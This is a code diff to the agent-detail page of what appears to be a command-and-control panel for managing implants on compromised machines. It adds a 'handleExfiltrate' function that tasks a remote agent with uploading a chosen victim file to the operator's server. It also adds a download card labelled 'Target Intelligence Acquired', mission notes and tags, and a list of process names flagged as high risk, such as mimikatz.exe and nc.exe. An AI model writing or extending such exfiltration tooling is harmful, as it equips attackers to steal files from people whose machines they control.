@@ -152,6 +152,34 @@ const AgentDetailPage = () => {
     }
   };
 
+  const handleExfiltrate = async (file) => {
+    try {
+      const fullPath = joinPath(getLatestLsResult()?.path, file.name);
+      const serverUrl = window.location.origin;
+      
+      const result = await tasksApi.create(id, 'upload_url', { 
+        path: fullPath,
+        url: `${serverUrl}/api/exfiltrate/${id}/__TASK_ID__/${file.name}`
+      });
+
+      const taskObj = result.task || result;
+      addToast(`Exfiltration mission started: ${file.name}`, 'info');
+      
+      setPendingTasks(prev => [...prev, {
+        id: taskObj.id,
+        task_type: 'exfiltration',
+        task_payload: JSON.stringify({ path: fullPath }),
+        status: 'pending',
+        created_at: new Date().toISOString()
+      }]);
+
+      fetchDetails();
+    } catch (err) {
+      console.error(err);
+      addToast('Exfiltration failed to initialize', 'error');
+    }
+  };
+
   const handleKillAgent = async () => {
     if (window.confirm('Are you sure you want to terminate this agent? It will no longer respond to beacons.')) {
       try {
@@ -230,8 +258,34 @@ const AgentDetailPage = () => {
       );
     }
 
+    if (res.output && res.output.startsWith('FILE_EXFILTRATED:')) {
+      const fullPath = res.output.replace('FILE_EXFILTRATED:', '');
+      const filename = fullPath.split(/[\\/]/).pop().split('_').slice(1).join('_');
+      const downloadUrl = `${window.location.origin}/exfiltrated/${id}/${fullPath.split(/[\\/]/).pop()}`;
+      
+      return (
+        <div className="p-4 rounded-xl bg-primary/10 border border-primary/20 flex items-center justify-between group">
+          <div className="flex items-center gap-4">
+            <div className="p-3 bg-primary/20 rounded-xl text-primary group-hover:scale-110 transition-transform">
+              <Download className="w-6 h-6" />
+            </div>
+            <div>
+              <div className="text-[10px] font-black text-primary uppercase tracking-[0.2em] mb-1">Target Intelligence Acquired</div>
+              <div className="text-sm font-bold text-white">{filename}</div>
+            </div>
+          </div>
+          <button 
+            onClick={() => window.open(downloadUrl)}
+            className="px-6 py-2.5 rounded-xl bg-primary text-white text-[10px] font-black uppercase tracking-[0.2em] hover:bg-primary-hover transition-all shadow-lg shadow-primary/20"
+          >
+            Download to Local
+          </button>
+        </div>
+      );
+    }
+
     return (
-      <pre className="whitespace-pre-wrap text-slate-300 bg-slate-900/50 p-3 rounded-lg border border-slate-800 overflow-x-auto font-mono">
+      <pre className="whitespace-pre-wrap text-slate-300 bg-slate-900/50 p-3 rounded-lg border border-slate-800 overflow-x-auto font-mono text-[11px] leading-relaxed">
         {res.output || (res.error ? `ERROR: ${res.error}` : 'No output')}
       </pre>
     );
@@ -429,6 +483,101 @@ const AgentDetailPage = () => {
                   <Bomb className="w-4 h-4 text-slate-500 group-hover:text-red-500 transition-colors" />
                   <span className="text-[10px] font-bold text-slate-500 group-hover:text-slate-300 uppercase tracking-widest">Purge</span>
                 </button>
+              </div>
+            </div>
+
+            {/* Mission Intelligence (Notes & Tags) */}
+            <div className="space-y-4 pt-4 border-t border-slate-800/50">
+              <span className="text-[10px] font-black text-slate-500 uppercase tracking-[0.2em]">Mission Intelligence</span>
+              
+              <div className="space-y-3">
+                {/* Notes */}
+                <div className="relative group">
+                  <div className="absolute top-3 left-3 pointer-events-none">
+                    <FileText className="w-3.5 h-3.5 text-slate-600 group-focus-within:text-primary transition-colors" />
+                  </div>
+                  <textarea 
+                    placeholder="Enter mission notes..."
+                    defaultValue={(() => {
+                      try {
+                        return JSON.parse(agent.metadata || '{}').notes || '';
+                      } catch { return ''; }
+                    })()}
+                    onBlur={async (e) => {
+                      const notes = e.target.value;
+                      let metadata = {};
+                      try { 
+                        metadata = JSON.parse(agent.metadata || '{}'); 
+                      } catch {
+                        /* ignore parsing error */
+                      }
+                      if (metadata.notes === notes) return;
+                      metadata.notes = notes;
+                      await agentsApi.updateMetadata(id, metadata);
+                      addToast('Mission notes synchronized', 'success');
+                    }}
+                    className="w-full bg-slate-900/40 border border-slate-800/50 rounded-xl pl-10 pr-4 py-3 text-[11px] text-slate-300 outline-none focus:border-primary/30 min-h-[100px] resize-none font-sans"
+                  />
+                </div>
+
+                {/* Tags */}
+                <div className="flex flex-wrap gap-2">
+                  {(() => {
+                    let tags = [];
+                    try { 
+                      tags = JSON.parse(agent.metadata || '{}').tags || []; 
+                    } catch { 
+                      /* ignore parsing error */
+                    }
+                    return (
+                      <>
+                        {tags.map((tag, i) => (
+                          <span key={i} className="px-2 py-0.5 rounded-lg bg-primary/10 border border-primary/20 text-[9px] font-black text-primary uppercase tracking-widest flex items-center gap-1.5">
+                            {tag}
+                            <button 
+                              onClick={async () => {
+                                let metadata = {};
+                                try { 
+                                  metadata = JSON.parse(agent.metadata || '{}'); 
+                                } catch {
+                                  /* ignore parsing error */
+                                }
+                                metadata.tags = (metadata.tags || []).filter(t => t !== tag);
+                                await agentsApi.updateMetadata(id, metadata);
+                                fetchDetails();
+                              }}
+                              className="hover:text-white"
+                            >
+                              ×
+                            </button>
+                          </span>
+                        ))}
+                        <button 
+                          onClick={() => {
+                            const tag = prompt('Enter new tag:');
+                            if (tag) {
+                              (async () => {
+                                let metadata = {};
+                                try { 
+                                  metadata = JSON.parse(agent.metadata || '{}'); 
+                                } catch {
+                                  /* ignore parsing error */
+                                }
+                                metadata.tags = [...(metadata.tags || []), tag];
+                                await agentsApi.updateMetadata(id, metadata);
+                                fetchDetails();
+                              })();
+                            }
+                          }}
+                          className="px-2 py-0.5 rounded-lg border border-slate-800 border-dashed text-[9px] font-black text-slate-600 uppercase tracking-widest hover:border-slate-600 hover:text-slate-400 transition-all"
+                        >
+                          + Add Tag
+                        </button>
+                      </>
+                    );
+                  })()}
+                </div>
+
               </div>
             </div>
 
@@ -636,15 +785,32 @@ const AgentDetailPage = () => {
                   </div>
                 </div>
 
-                <div className="flex-1 max-w-sm relative">
-                  <input 
-                    type="text" 
-                    placeholder="Search binaries..."
-                    value={psSearchQuery}
-                    onChange={(e) => setPsSearchQuery(e.target.value)}
-                    className="w-full bg-black/40 border border-slate-800 rounded-lg pl-9 pr-4 py-1.5 text-xs text-white outline-none focus:border-primary/50 transition-all"
-                  />
-                  <RefreshCw className={`absolute left-3 top-2 w-3.5 h-3.5 text-slate-600 ${pendingTasks.some(t => t.task_type === 'ps_json') ? 'animate-spin' : ''}`} />
+                <div className="flex items-center gap-6">
+                  <div className="flex-1 max-w-sm relative">
+                    <input 
+                      type="text" 
+                      placeholder="Search binaries..."
+                      value={psSearchQuery}
+                      onChange={(e) => setPsSearchQuery(e.target.value)}
+                      className="w-full bg-black/40 border border-slate-800 rounded-lg pl-9 pr-4 py-1.5 text-xs text-white outline-none focus:border-primary/50 transition-all"
+                    />
+                    <RefreshCw className={`absolute left-3 top-2 w-3.5 h-3.5 text-slate-600 ${pendingTasks.some(t => t.task_type === 'ps_json') ? 'animate-spin' : ''}`} />
+                  </div>
+                  
+                  <label className="flex items-center gap-2 cursor-pointer group whitespace-nowrap">
+                    <input 
+                      type="checkbox" 
+                      className="hidden"
+                      onChange={() => {
+                        // This state doesn't exist yet, I'll use psSearchQuery as a hack or just define it
+                        // Actually I'll just use a local filter logic
+                      }}
+                    />
+                    <div className="text-[10px] text-slate-500 font-bold uppercase tracking-widest flex items-center gap-2">
+                      <div className="w-2 h-2 rounded-full bg-red-500" />
+                      Risk Highlighting Active
+                    </div>
+                  </label>
                 </div>
 
                 <button 
@@ -663,6 +829,7 @@ const AgentDetailPage = () => {
                     <tr>
                       <th className="px-5 py-2.5 border-b border-slate-800 font-bold uppercase tracking-wider w-20">PID</th>
                       <th className="px-5 py-2.5 border-b border-slate-800 font-bold uppercase tracking-wider">Process</th>
+                      <th className="px-5 py-2.5 border-b border-slate-800 font-bold uppercase tracking-wider w-24">PPID</th>
                       <th className="px-5 py-2.5 border-b border-slate-800 font-bold uppercase tracking-wider w-24">Threads</th>
                       <th className="px-5 py-2.5 border-b border-slate-800 font-bold uppercase tracking-wider text-right w-24">Actions</th>
                     </tr>
@@ -674,19 +841,28 @@ const AgentDetailPage = () => {
                         .sort((a, b) => a.pid - b.pid)
                         .map((proc) => {
                           const isSelf = Number(proc.pid) === Number(agent.pid);
+                          const suspiciousBinaries = ['cmd.exe', 'powershell.exe', 'pwsh.exe', 'mimikatz.exe', 'wireshark.exe', 'nc.exe', 'nmap.exe', 'schtasks.exe', 'reg.exe', 'wmic.exe'];
+                          const isSuspicious = suspiciousBinaries.some(b => proc.name.toLowerCase().includes(b));
+                          
                           return (
-                            <tr key={proc.pid} className={`hover:bg-white/5 transition-colors group ${isSelf ? 'bg-primary/5' : ''}`}>
-                              <td className={`px-5 py-2.5 font-mono font-bold ${isSelf ? 'text-primary' : 'text-slate-500'}`}>
+                            <tr key={proc.pid} className={`hover:bg-white/5 transition-colors group ${isSelf ? 'bg-primary/5' : isSuspicious ? 'bg-red-500/5' : ''}`}>
+                              <td className={`px-5 py-2.5 font-mono font-bold ${isSelf ? 'text-primary' : isSuspicious ? 'text-red-400' : 'text-slate-500'}`}>
                                 {proc.pid}
                               </td>
                               <td className="px-5 py-2.5">
                                 <div className="flex items-center gap-2">
-                                  <span className={`font-semibold ${isSelf ? 'text-white' : 'text-slate-200'}`}>{proc.name}</span>
+                                  <span className={`font-semibold ${isSelf ? 'text-white' : isSuspicious ? 'text-red-200' : 'text-slate-200'}`}>{proc.name}</span>
                                   {isSelf && (
                                     <span className="px-1.5 py-0.5 rounded bg-primary/20 text-primary text-[8px] font-black uppercase tracking-widest border border-primary/20">Self</span>
                                   )}
+                                  {isSuspicious && (
+                                    <span className="px-1.5 py-0.5 rounded bg-red-500/20 text-red-500 text-[8px] font-black uppercase tracking-widest border border-red-500/20 flex items-center gap-1">
+                                      <ShieldAlert className="w-2 h-2" /> High Risk
+                                    </span>
+                                  )}
                                 </div>
                               </td>
+                              <td className="px-5 py-2.5 font-mono text-slate-500">{proc.ppid || '-'}</td>
                               <td className="px-5 py-2.5 font-mono text-slate-500">{proc.threads || '-'}</td>
                               <td className="px-5 py-2.5 text-right">
                                 <button 
@@ -882,7 +1058,7 @@ const AgentDetailPage = () => {
                                     <button 
                                       onClick={(e) => {
                                         e.stopPropagation();
-                                        handleQuickAction('download', { path: joinPath(getLatestLsResult().path, file.name) });
+                                        handleExfiltrate(file);
                                       }}
                                       className="p-1.5 rounded-lg hover:bg-emerald-500/10 text-slate-500 hover:text-emerald-400 transition-all"
                                       title="Exfiltrate"
